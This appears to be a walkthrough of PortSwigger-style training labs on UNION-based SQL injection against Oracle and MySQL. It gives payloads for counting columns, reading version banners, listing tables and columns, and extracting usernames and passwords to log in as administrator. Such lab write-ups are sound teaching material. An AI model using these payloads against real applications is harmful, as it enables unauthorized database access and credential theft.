## 3. SQL Injection: Querying the Database Type and Version on Oracle

![img](/img/SQLi_WSA_Labs/6.png)

This lab contains a SQL injection vulnerability in the product category filter. A `UNION` attack can be used to retrieve the results of an injected query.

**Goal:** Display the database version string.

### 3.1 Oracle-Specific Information

In Oracle, every `SELECT` statement must include a `FROM` clause with a valid table name.

For `UNION SELECT` attacks, Oracle's built-in `dual` table can be used when no actual table is required.

```sql
UNION SELECT 'abc' FROM dual
```

### 3.2 Finding the Number of Columns

Before using a `UNION SELECT`, determine the number of columns returned by the original query.

One method is to progressively add `NULL` values to the `UNION SELECT` until the error disappears.

```sql
/filter?category=' UNION SELECT NULL FROM dual--
```

Selecting one column produces an **Internal Server Error**, indicating a column-count mismatch.

![img](/img/SQLi_WSA_Labs/7.png)

Add another `NULL` value:

```sql
/filter?category=' UNION SELECT NULL,NULL FROM dual--
```

With two columns, the **Internal Server Error** disappears, indicating that the original query returns **two columns**.

![img](/img/SQLi_WSA_Labs/8.png)

#### Alternative Method: `ORDER BY`

The number of columns can also be determined by incrementing the `ORDER BY` column index until an error occurs.

```txt
/filter?category=' ORDER BY 1--
/filter?category=' ORDER BY 2--
/filter?category=' ORDER BY 3--
.
.
.
/filter?category=' ORDER BY n--
```

If `ORDER BY N` causes an error while `ORDER BY N-1` succeeds, the query returns **N-1 columns**.

### 3.3 Displaying the Database Version

Now that we know the query returns two columns, we can retrieve the Oracle database version using the `BANNER` column from the `v$version` view.

```sql
'UNION SELECT BANNER,NULL FROM v$version--
```

![img](/img/SQLi_WSA_Labs/9.png)

## 4. SQL Injection: Querying the Database Type and Version on MySQL and Microsoft

This lab is similar to the previous one, but the database type is different.

### 4.1 Finding the Number of Columns

**Note:** In MySQL, `--` starts a comment only when followed by whitespace or a control character. When entering the payload through a browser or Burp Suite, the required trailing space may be stripped or encoded.

Appending `+` ensures that a character follows `--`, producing `--+`

```txt
/filter?category=' UNION SELECT NULL,NULL--+
/filter?category=' UNION SELECT NULL,NULL-- anything at all
```

![img](/img/SQLi_WSA_Labs/10.png)

Alternatively, MySQL supports `#` as a comment marker. However, `#` is treated as a URL fragment by browsers and is therefore not sent to the server. To use it, send the request through **Burp Repeater**.

Use a `UNION SELECT` statement with `NULL` values to determine the number of columns:

```sql
' UNION SELECT NULL,NULL#
```

![img](/img/SQLi_WSA_Labs/11.png)

The absence of an error indicates that the query returns **two columns**.

### 4.2 Displaying the Database Version

The MySQL `@@version` system variable can be used to retrieve the database version:

```txt
' UNION SELECT @@version,NULL#
' UNION SELECT @@version,NULL--+
```

![img](/img/SQLi_WSA_Labs/12.png)

## 5. SQL Injection Attack: Listing Database Contents on Non-Oracle Databases

This lab contains a SQL injection vulnerability in the product category filter. Because query results are reflected in the application's response, a `UNION` attack can be used to retrieve data from other database tables.

The application includes a login function, and the database contains a table storing usernames and passwords. The objective is to identify the table and its columns, extract the credentials, and use them to log in as the administrator.

### 5.1 Finding the Number of Columns

```sql
' UNION SELECT NULL,NULL--+
```

The absence of an error indicates that the original query returns **two columns**.

![img](/img/SQLi_WSA_Labs/13.png)

### 5.2 Retrieving the List of Tables in the Database

The credentials table is unknown, so query `INFORMATION_SCHEMA` to enumerate the database tables. `INFORMATION_SCHEMA` is an ANSI-standard, read-only virtual database that exposes metadata about the database system.

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--+
```

The results contain a long list of tables, including `users_avyuyg`, which appears to contain the required credentials.

![img](/img/SQLi_WSA_Labs/14.png)

### 5.3 Retrieving the Table's Column Names

After identifying the table, determine its column names so the correct fields can be selected. Again, query `INFORMATION_SCHEMA`.

```sql
' union select column_name,NULL from information_schema.columns WHERE table_name = 'users_avyuyg' --+
```

The query successfully retrieves the column names from `users_avyuyg`.

![img](/img/SQLi_WSA_Labs/15.png)

### 5.4 Retrieving Credentials

Use the identified username and password columns to extract the stored credentials.

```sql
' union select username_pbsvew,password_ngmnjz from users_avyuyg --
```

![img](/img/SQLi_WSA_Labs/16.png)

### 5.5 Using the Credentials to Complete the Lab

The extracted credentials can then be used to log in as the **administrator**, completing the lab.

![img](/img/SQLi_WSA_Labs/17.png)

## 6. SQL Injection Attack: Listing Database Contents on Oracle

This lab is similar to the previous one, but the target database is **Oracle**. The main difference is that Oracle provides different system views and requires the `DUAL` table when using `SELECT` without querying an application table.

### 6.1 Finding the Number of Columns

```sql
' UNION SELECT NULL,NULL FROM dual--
```

The absence of an error indicates that the original query returns **two columns**.

`DUAL` is a special one-row, one-column table provided by Oracle. It allows queries such as `SELECT NULL` to execute when no application table is being queried.

![img](/img/SQLi_WSA_Labs/18.png)

### 6.2 Retrieving the List of Tables in the Database

Oracle provides the `ALL_TABLES` system view, which contains information about tables accessible to the current database user.

```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

The query returns the accessible table names. Identify the table that appears to contain user credentials, such as `USERS_LRUKIQ`.

![img](/img/SQLi_WSA_Labs/19.png)

### 6.3 Retrieving the Table's Column Names

Use Oracle's `ALL_TAB_COLUMNS` view to enumerate the columns belonging to the identified table.

```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_LRUKIQ'--
```

This reveals the column names, allowing the username and password fields to be identified.

![img](/img/SQLi_WSA_Labs/20.png)

### 6.4 Retrieving Credentials

Once the credential columns are known, select them from the identified table.

```sql
' UNION SELECT USERNAME_PUEFME, PASSWORD_IZSIBX FROM USERS_LRUKIQ--
```

The query returns the stored usernames and passwords.

![img](/img/SQLi_WSA_Labs/21.png)

### 6.5 Using the Credentials to Complete the Lab

Use the extracted credentials to log in as the **administrator**, completing the lab.

![img](/img/SQLi_WSA_Labs/22.png)

## 7. SQL injection UNION attack, finding a column containing text

The lab provides a random value that must appear in the query results. To solve it, perform a SQL injection UNION attack that returns an additional row containing the provided value.

This identifies which column is compatible with string data.

The original query returns 3 columns:

```sql
' UNION SELECT NULL,NULL,NULL --+
```

![img](/img/SQLi_WSA_Labs/23.png)

As shown above, the lab requires us to inject the provided `'Ui3Oqk'` value so it can trigger the lab as solved.

We progressively replace each `NULL` with `'Ui3Oqk'` to determine which column is compatible with string data. Any other string can be used to identify the compatible column, but this lab specifically requires the provided `'Ui3Oqk'` value to trigger the solved-lab event.

Replacing the first `NULL` with `'Ui3Oqk'` results in an `Internal Server Error`:

```sql
' UNION SELECT 'Ui3Oqk',NULL,NULL --+
```

![img](/img/SQLi_WSA_Labs/24.png)

Replacing the second `NULL` with `'Ui3Oqk'` returns `'Ui3Oqk'` as an additional row containing the required value:

```sql
' UNION SELECT NULL,'Ui3Oqk',NULL --+
```

![img](/img/SQLi_WSA_Labs/25.png)

This confirms that the second column is compatible with string data and solves the lab.

## 8. SQL injection UNION attack, retrieving data from other tables

**Given:**

This lab contains a SQL injection vulnerability in the product category filter. The query results are returned in the application's response, allowing a UNION attack to retrieve data from other tables.

The database contains a `users` table with `username` and `password` columns.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, then use the credentials to log in as the administrator.

**Solution:**

First, determine the number of columns returned by the original query:

```sql
' UNION SELECT NULL,NULL--+
```

![img](/img/SQLi_WSA_Labs/26.png)

The response confirms that the original query returns **2 columns**.

Since the `users` table contains the required `username` and `password` columns, we can retrieve them using:

```sql
' UNION SELECT username,password FROM users--
```

![img](/img/SQLi_WSA_Labs/27.png)

The UNION query returns the usernames and passwords from the `users` table. Use the administrator credentials from the results to log in and complete the lab.
